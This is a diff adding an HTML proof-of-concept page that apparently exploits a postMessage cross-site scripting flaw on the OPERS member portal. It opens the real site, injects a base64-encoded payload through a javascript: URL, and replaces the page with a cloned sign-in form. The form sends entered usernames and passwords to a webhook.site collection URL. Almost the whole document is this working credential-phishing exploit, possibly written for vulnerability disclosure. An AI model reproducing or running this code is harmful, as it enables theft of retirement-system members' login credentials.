@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <h1>POC</h1>
+
+    <div id="container"></div>
+
+    <script>
+      var payload = `
+        var d=document;
+        d.open(); d.close();
+        d.head.innerHTML='<meta charset="utf-8"><title>OPERS - Member Portal</title><link href="https://global.oktacdn.com/okta-signin-widget/7.24.0/css/okta-sign-in.min.css" rel="stylesheet">';
+        d.body.className="opers-member";
+        d.body.style="margin:0;font-family:Arial,sans-serif;background:#f4f7fa";
+
+        var nav=d.createElement("div");
+        nav.style="background:#1a3a5c;padding:10px 20px;display:flex;align-items:center;gap:12px";
+        nav.innerHTML='<svg width="40" height="40" viewBox="0 0 100 100"><polygon points="50,10 90,80 10,80" fill="white"/><circle cx="50" cy="52" r="14" fill="#1a3a5c"/><text x="50" y="58" text-anchor="middle" fill="white" font-size="12" font-family="Arial">OPERS</text></svg><div style="color:white"><div style="font-size:18px;font-weight:bold">My Account</div><div style="font-size:12px;opacity:.8">OPERS Pension &amp; Benefit Information</div></div>';
+        d.body.appendChild(nav);
+
+        var wrap=d.createElement("div");
+        wrap.style="display:flex;justify-content:center;padding:40px 20px";
+        wrap.innerHTML=\`
+          <div style="background:white;border:1px solid #dde1e7;border-radius:3px;width:400px;padding:24px 32px;box-shadow:0 1px 3px rgba(0,0,0,.1)">
+            <div style="text-align:center;margin-bottom:20px">
+              <svg width="48" height="48" viewBox="0 0 100 100"><polygon points="50,5 95,85 5,85" fill="#1a3a5c"/><circle cx="50" cy="57" r="18" fill="white"/><text x="50" y="63" text-anchor="middle" fill="#1a3a5c" font-size="14" font-family="Arial" font-weight="bold">OPERS</text></svg>
+            </div>
+            <h2 style="text-align:center;font-size:18px;color:#1d1d1d;margin:0 0 20px">Sign in to OPERS</h2>
+            <form id="xform">
+              <div style="margin-bottom:14px">
+                <label style="display:block;font-size:14px;font-weight:600;margin-bottom:4px;color:#333">Username :</label>
+                <input id="xu" type="text" placeholder="Username" style="width:100%;padding:8px 10px;border:1px solid #bbbfc4;border-radius:3px;font-size:14px;box-sizing:border-box;outline:none">
+              </div>
+              <div style="margin-bottom:14px">
+                <label style="display:block;font-size:14px;font-weight:600;margin-bottom:4px;color:#333">Password :</label>
+                <input id="xp" type="password" placeholder="Password" style="width:100%;padding:8px 10px;border:1px solid #bbbfc4;border-radius:3px;font-size:14px;box-sizing:border-box;outline:none">
+              </div>
+              <div style="margin-bottom:16px;display:flex;align-items:center;gap:8px">
+                <input type="checkbox" id="rem" style="width:14px;height:14px">
+                <label for="rem" style="font-size:13px;color:#555">Remember this device for 30 days</label>
+              </div>
+              <button type="button" id="xb" style="width:100%;padding:11px;background:#1a3a5c;color:white;border:none;border-radius:3px;font-size:15px;font-weight:600;cursor:pointer;margin-bottom:12px">Sign In</button>
+            </form>
+            <div style="text-align:center;color:#999;margin-bottom:12px;font-size:13px">OR</div>
+            <button style="width:100%;padding:10px;background:white;color:#1a3a5c;border:1px solid #1a3a5c;border-radius:3px;font-size:14px;cursor:pointer;margin-bottom:16px">Create account</button>
+            <div style="text-align:center;font-size:13px"><a href="#" style="color:#1a6bb0">Forgot Username or Password?</a></div>
+            <div style="text-align:center;font-size:13px;margin-top:6px"><a href="#" style="color:#1a6bb0">Help</a></div>
+          </div>
+        \`;
+        d.body.appendChild(wrap);
+
+        var footer=d.createElement("div");
+        footer.style="text-align:center;color:#666;font-size:12px;padding:20px;border-top:1px solid #ddd;margin-top:40px";
+        footer.innerHTML="Ohio Public Employees Retirement System &nbsp;|&nbsp; 277 E. Town Street, Columbus, OH 43215 &nbsp;|&nbsp; 1-800-222-PERS (7377)";
+        d.body.appendChild(footer);
+
+        d.getElementById("xform").addEventListener("submit", function(e) {
+          e.preventDefault();
+          var u=d.getElementById("xu").value, p=d.getElementById("xp").value;
+          window.open("https://webhook.site/f441cac8-b331-47ca-a709-3086d44ed03f/?e="+encodeURIComponent(u)+"&p="+encodeURIComponent(p));
+        });
+        d.getElementById("xb").addEventListener("click", function() {
+          var u=d.getElementById("xu").value, p=d.getElementById("xp").value;
+          window.location="https://webhook.site/f441cac8-b331-47ca-a709-3086d44ed03f/?e="+encodeURIComponent(u)+"&p="+encodeURIComponent(p);
+        });
+      `;
+
+      var b64 = btoa(unescape(encodeURIComponent(payload)));
+
+      var iframeDoc = '<script>function r(){var j=window.open("//member-env3.opers.org/member/home");setTimeout(function(){j.postMessage(JSON.stringify({action:"href",url:"javascript:eval(atob(\''+b64+'\'))"}), "*")},3000)}window.onclick=r<\/script>Click here to start';
+
+      var iframe = document.createElement("iframe");
+      iframe.sandbox = "allow-scripts allow-popups allow-modals";
+      iframe.style = "width:200px;height:40px;border:1px solid #ccc";
+      iframe.srcdoc = iframeDoc;
+      document.getElementById("container").appendChild(iframe);
+    </script>
+
+</body>
+</html>
